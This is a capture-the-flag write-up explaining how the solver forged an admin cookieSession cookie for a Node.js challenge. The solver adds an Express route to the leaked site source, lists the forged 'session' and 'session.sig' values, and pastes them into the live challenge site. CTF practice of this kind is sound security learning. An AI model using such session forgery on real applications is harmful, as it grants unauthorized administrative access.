## Description

I hope the circuit breaker period made you a better baker, because you are going to have to bake your own cookies. Can you retrieve the second flag?

The website.zip here is the same as in part 1.

# Solution

I read through the nodejs code. After googling, I got some inspiration, especially from : https://www.smrrd.de/nodejs-hacking-challenge-writeup.html. Basically, cookieSession tracks sessions by using special cookies, which have the required data encoded in to them (no special data stored client side or anything).

I extracted website.zip, added code such that it creates a cookie with `req.session.admin = true`, and ran it to generate the cookie.
If you are interested in further details, the code is in the folder `server-solve-for-cookie\`. Just npm run, and go to the path `/add_admin_cookie`
The main code added is
```
//Added 
app.get('/add_admin_cookie', (req, res) => {
  req.session.admin = true;
  res.send('Added admin cookie')
  console.log(req.session);
});
```

I generated these cookies
Cookie | Value
---|---
`session.sig`|`_xVjCLdo74nT98RCUcPQ3zCBkNQ`
`session`|`eyJhZG1pbiI6dHJ1ZX0=`

After that the endpoint works on the local server

I copied these cookies for use to the website (with the help of Chrome Dev Tools), and got the flag
